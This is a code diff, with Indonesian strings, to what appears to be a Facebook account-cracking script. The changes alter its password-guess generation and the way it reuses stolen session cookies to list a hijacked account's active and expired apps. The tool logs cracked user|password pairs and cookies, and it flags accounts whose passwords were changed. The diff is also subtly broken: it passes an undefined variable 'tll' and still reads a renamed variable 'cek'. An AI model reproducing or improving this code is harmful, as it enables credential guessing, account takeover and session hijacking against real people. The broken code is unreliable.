@@ -592,11 +592,12 @@ def buat_gab():
 	else:
 		print("> Skipped")
 def sttt(userr, pww, tta):
-	global user,pw
+	global user,pw,ttl
 	try:
 		user = userr
 		pw = pww
-		cek_opsi_crack(user, pw, tta)
+		ttl = tta
+		cek_opsi_crack(user, pw, tll)
 	except:pass
 
 #########################
@@ -762,8 +763,8 @@ def cek_opsi_crack(user,pw,ttl):
 						except:
 							textg +=(f"\r{jarak}{war}Akun Ini Tap Yes !!\n{jarak}{war}Password Sudah DiUbah !!\n{jarak}{war}{user}|{''.join(pwBaru)}\n{jarak}{war}Cookie: {coki}							\n")
 						bokep_japan_yang_terbaru("OK-OK", user, pwBaru, "-") # CHECK GAME V 1
-						cek = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
-						cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
+						cek_apk = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
+						cek_app = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
 						if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
 							if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
 								textg +=(f"{jarak}{war}Apk Aktif •\n")
@@ -771,8 +772,8 @@ def cek_opsi_crack(user,pw,ttl):
 						else:
 							hit1,hit2 = 0,0
 							textg +=(f"{jarak}{war}Apk Aktif\n")
-							apkAktif = re.findall('\<span\ class\=\"ca\ cb\"\>(.*?)<\/span\>',str(cek))
-							ditambahkan = re.findall('\<div\ class\=\"cc\ cd\ ce\"\>(.*?)<\/div\>',str(cek))
+							apkAktif = re.findall('\<span\ class\=\"ca\ cb\"\>(.*?)<\/span\>',str(cek_apk))
+							ditambahkan = re.findall('\<div\ class\=\"cc\ cd\ ce\"\>(.*?)<\/div\>',str(cek_apk))
 							for muncul in apkAktif:
 								hit1+=1
 								textg +=(f"{jarak}{jarak}[{hit1}] {I}{muncul}{Q} {C}{ditambahkan[hit2]}{Q}\n")
@@ -783,8 +784,8 @@ def cek_opsi_crack(user,pw,ttl):
 						else:
 							hit1,hit2=0,0
 							textg +=(f"{jarak}{war}Apk Kadaluarsa\n")
-							apkKadaluarsa = re.findall('\<span\ class\=\"ca\ cb\"\>(.*?)<\/span\>',str(cek2))
-							kadaluarsa = re.findall('\<div\ class\=\"cc\ cd\ ce\"\>(.*?)<\/div\>',str(cek2))
+							apkKadaluarsa = re.findall('\<span\ class\=\"ca\ cb\"\>(.*?)<\/span\>',str(cek_app))
+							kadaluarsa = re.findall('\<div\ class\=\"cc\ cd\ ce\"\>(.*?)<\/div\>',str(cek_app))
 							for munn in apkKadaluarsa:
 								hit1+=1
 								textg +=(f"{jarak}{jarak}[{hit1}] {K}{munn}{Q} {U}{kadaluarsa[hit2]}{Q}\n")
@@ -934,9 +935,7 @@ def generate(text):
 				results.append("786786")
 				results.append("000786")
 			else:
-				results.append(i+"123")
-				results.append(i+"1234")
-				results.append(i+"12345")
+				results.append(i+"123456")
 	return results
 jangan = ("""
 				elif "Segera Hadir" in kiky_pass:
@@ -1049,10 +1048,11 @@ class crackmenu:
                     dob = ' '
                 except:
                     pass
-                if opsii == "y" or "y" == opsii:
-                    sttt(user, pw, dob)
-                else:
-                    print ('\r%s[%s%s%s] %s%s|%s                  %s'%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,K,user,pw,Q))
+#                if opsii == "y" or "y" == opsii:
+ #                   sttt(user, pw, dob)
+  #              else:
+   #                 print ('\r%s[%s%s%s] %s%s|%s                  %s'%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,K,user,pw,Q))
+                print ('\r%s[%s%s%s] %s%s|%s                  %s'%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,K,user,pw,Q))
                 wrt = ('%s|%s'%(user,pw))
                 cp.append(wrt)
                 bokep_japan_yang_terbaru("CP", user, pw, dob)
